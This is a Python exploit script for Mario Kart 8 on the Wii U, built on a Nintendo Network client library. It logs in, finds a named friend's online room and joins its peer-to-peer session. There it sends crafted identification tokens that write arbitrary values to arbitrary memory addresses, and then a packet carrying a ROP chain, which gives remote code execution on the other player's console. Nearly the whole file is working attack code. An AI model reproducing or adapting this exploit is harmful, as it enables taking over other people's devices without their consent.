
from nintendo.nex import backend, authentication, matchmaking
from nintendo.pia.station import IdentificationInfo
from nintendo.pia.session import PIASession
from nintendo.account import AccountAPI
from nintendo.games import MK8
import struct
import time

import logging
logging.basicConfig(level=logging.DEBUG)

# Device id can be obtained by calling MCP_GetDeviceId on the Wii U
# Serial number can be found on the back of the Wii U
DEVICE_ID = 1234567890
SERIAL_NUMBER = "..."
SYSTEM_VERSION = 0x220
REGION = 4 #EUR
COUNTRY = "NL"

USERNAME = "..." #Nintendo network id
PASSWORD = "..." #Nintendo network password

FRIEND_NAME = "..." #Nintendo network id

# Log in on account server
api = AccountAPI()
api.set_device(DEVICE_ID, SERIAL_NUMBER, SYSTEM_VERSION, REGION, COUNTRY)
api.set_title(MK8.TITLE_ID_EUR, MK8.LATEST_VERSION)
api.login(USERNAME, PASSWORD)

my_pid = api.get_pid(USERNAME)
friend_pid = api.get_pid(FRIEND_NAME)

mii_name = api.get_mii(my_pid).name

# Connect to game server
nex_token = api.get_nex_token(MK8.GAME_SERVER_ID)
backend = backend.BackEndClient(MK8.ACCESS_KEY, MK8.NEX_VERSION)
backend.connect(nex_token.host, nex_token.port)
backend.login(
	nex_token.username, nex_token.password,
	authentication.AuthenticationInfo(nex_token.token, MK8.SERVER_VERSION)
)

matchmake_ext = matchmaking.MatchmakeExtensionClient(backend)

# Find friend room
playing_sessions = matchmake_ext.get_playing_session([friend_pid])
if not playing_sessions:
	raise RuntimeError("Couldn't find friend room for %s" %FRIEND_NAME)

gathering = playing_sessions[0].gathering

# Request session key (for p2p)
session_key = matchmake_ext.join_matchmake_session(
	gathering.id, "This is NintendoClients"
)

matchmaker = matchmaking.MatchMakingClient(backend)
session_urls = matchmaker.get_session_urls(gathering.id)

# Constructs an indentification token that writes
# an arbitrary value at an arbitrary address
def write(addr, value):
	func = 0xE8A26D4
	dummy = 0xAAAAAAAA
	strbuf = 0x386043D8
	vtable = 0x386042D4
	return struct.pack(
		">IIIIIIII", addr - 0xC, func, dummy,
		dummy, strbuf, vtable, dummy, value
	)

injections = [
	(0x1066f9b8, 0xEBC0314), #StationPacketHandler::AssignPacket -> return 0
	(0x1066889c, 0xEBE6624)  #Md5Context::GetHashSize -> memcpy on stack
]

rop_payload = [ #rop chains are fun
	0, 0, 0, 0, 0, 0, 0, 0x387D36C0,
	0, 0xE1D9574, 0, 0,
	0, 0x1031618,
	0x726f7020, 0x63686169, 0x6e732061, 0x72652066,
	0x756e203a, 0x29000000
]

rop_packet = b"\x32\xAB\x98\x64\x01\x00\x00\x00"
rop_packet += struct.pack(">%iI" %len(rop_payload), *rop_payload)

# Initialize P2P session
session = PIASession(backend, session_key)
session.start(write(*injections[0]), mii_name)

# ResendingTransport hack that ignores acknowledgement
def send_with_ack(station, message):
	ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
	message.payload += struct.pack(">I", ack_id)
	session.transport.send(station, message)

host = session.connect_to_host(session_urls)
session.resending_transport.send = send_with_ack
session.mesh_protocol.send_join_request(host) #First injection
time.sleep(1)

# Send disconnection request
session.station_protocol.send_disconnection_request(host)
# Replace identification token
session.station.identification_info = \
	IdentificationInfo(write(*injections[1]), mii_name)
# We need to perform the connection manually now
session.station_protocol.send_connection_request(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
session.station_protocol.send_connection_response(host)
time.sleep(0.1)
ack_id = next(session.resending_transport.ack_id) & 0xFFFFFFFF
session.station_protocol.send_ack(host, struct.pack(">I", ack_id))
time.sleep(1)
# Send join request
session.mesh_protocol.send_join_request(host)
time.sleep(1)

# Finally, send packet with ROP chain
session.transport.transport.socket.send(rop_packet, host.address)

# Disconnect from game server
backend.close()
